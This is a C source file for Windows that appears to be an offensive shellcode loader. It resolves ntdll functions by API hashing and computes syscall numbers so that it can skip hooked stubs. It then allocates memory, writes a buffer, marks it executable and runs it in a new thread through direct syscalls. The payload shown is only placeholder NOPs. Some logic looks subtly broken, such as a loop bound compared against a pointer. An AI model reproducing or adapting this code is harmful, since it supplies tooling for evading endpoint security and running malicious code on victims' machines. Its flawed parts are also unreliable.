#include <stdio.h>
#include <Windows.h>

#include "ntdll.h"

extern VOID SetSyscall(WORD);
extern CallSyscall();

typedef struct _FUNCTION_INFO {
	DWORD64 dwFunctionHash;
	PVOID pFunctionAddr;
	WORD wSyscall;
} FUNCTION_INFO, * PFUNCTION_INFO;

typedef struct _FUNCTION_LIST {
	FUNCTION_INFO NtAllocateVirtualMemory;
	FUNCTION_INFO NtWriteVirtualMemory;
	FUNCTION_INFO NtProtectVirtualMemory;
	FUNCTION_INFO NtCreateThreadEx;
	FUNCTION_INFO NtWaitForSingleObject;
} FUNCTION_LIST, * PFUNCTION_LIST;

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetFunctionAddress(PFUNCTION_INFO funcInfo) {

	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pLdrDataEntry->DllBase;
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pLdrDataEntry->DllBase + pImageDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pLdrDataEntry->DllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImgExportDir->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pLdrDataEntry->DllBase + pImgExportDir->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pLdrDataEntry->DllBase + pImgExportDir->AddressOfNameOrdinals);

	for (WORD i = 0; i < pdwAddressOfNames; i++)
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pLdrDataEntry->DllBase + pdwAddressOfNames[i]);
		PVOID pFunctionAddress = (PBYTE)pLdrDataEntry->DllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];

		if (djb2(pczFunctionName) == funcInfo->dwFunctionHash)
		{
			funcInfo->pFunctionAddr = pFunctionAddress;
			return TRUE;
		}
	}
	return FALSE;

}

BOOL GetSyscall(PFUNCTION_INFO funcInfo)
{
	FUNCTION_INFO NtLoadKey3 = { 0 }; //Last syscall
	NtLoadKey3.dwFunctionHash = 0x4a063545a871d472;
	GetFunctionAddress(&NtLoadKey3);

	FUNCTION_INFO NtAccessCheck = { 0 }; //First syscall
	NtAccessCheck.dwFunctionHash = 0x713e7508211f4d66;
	GetFunctionAddress(&NtAccessCheck);

	DWORD64 dwOffset = (DWORD64)NtLoadKey3.pFunctionAddr - (DWORD64)NtAccessCheck.pFunctionAddr;

	WORD syscallID = -1;

	for (WORD i = 0; i < dwOffset; i++) {
		PBYTE pParser = (DWORD64)NtAccessCheck.pFunctionAddr + i;

		if (pParser[0] == 0x4c &&
			pParser[1] == 0x8b &&
			pParser[2] == 0xd1 &&
			pParser[3] == 0xb8)
		{
			syscallID++;
		}

		else if (pParser[0] == 0xe9)
		{
			syscallID++;
		}

		if (pParser == funcInfo->pFunctionAddr)
		{
			funcInfo->wSyscall = syscallID;
			return TRUE;
		}
	}

	return FALSE;
}

unsigned char buf[] = "\x90\x90\x90\x90";

int main() {

	FUNCTION_LIST flList = { 0 };
	flList.NtAllocateVirtualMemory.dwFunctionHash = 0xf5bd373480a6b89b;
	flList.NtWriteVirtualMemory.dwFunctionHash = 0x68a3c2ba486f0741;
	flList.NtProtectVirtualMemory.dwFunctionHash = 0x858bcb1046fb6a37;
	flList.NtCreateThreadEx.dwFunctionHash = 0x64dc7db288c5015f;
	flList.NtWaitForSingleObject.dwFunctionHash = 0xc6a2fa174e551bcb;


	if (GetFunctionAddress(&flList.NtAllocateVirtualMemory))
		if (!GetSyscall(&flList.NtAllocateVirtualMemory))
			return 0;

	if (GetFunctionAddress(&flList.NtWriteVirtualMemory))
		if (!GetSyscall(&flList.NtWriteVirtualMemory))
			return 0;

	if (GetFunctionAddress(&flList.NtProtectVirtualMemory))
		if (!GetSyscall(&flList.NtProtectVirtualMemory))
			return 0;

	if (GetFunctionAddress(&flList.NtCreateThreadEx))
		if (!GetSyscall(&flList.NtCreateThreadEx))
			return 0;

	if (GetFunctionAddress(&flList.NtWaitForSingleObject))
		if (!GetSyscall(&flList.NtWaitForSingleObject))
			return 0;

	SIZE_T sSizeBuf = sizeof(buf);

	PVOID pAddr = NULL;
	NTSTATUS status = 0;
	SetSyscall(flList.NtAllocateVirtualMemory.wSyscall);
	status = CallSyscall((HANDLE)-1, &pAddr, 0, &sSizeBuf, MEM_COMMIT, PAGE_READWRITE);

	ULONG uOut = 0;
	SetSyscall(flList.NtWriteVirtualMemory.wSyscall);
	status = CallSyscall((HANDLE)-1, pAddr, &buf, sizeof(buf), &uOut);

	ULONG uOldProtect = 0;
	SetSyscall(flList.NtProtectVirtualMemory.wSyscall);
	status = CallSyscall((HANDLE)-1, &pAddr, &sSizeBuf, PAGE_EXECUTE_READ, &uOldProtect);

	HANDLE hThread = NULL;
	SetSyscall(flList.NtCreateThreadEx.wSyscall);
	status = CallSyscall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)pAddr, NULL, FALSE, NULL, NULL, NULL, NULL);

	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	SetSyscall(flList.NtWaitForSingleObject.wSyscall);
	status = CallSyscall(hThread, FALSE, &Timeout);

}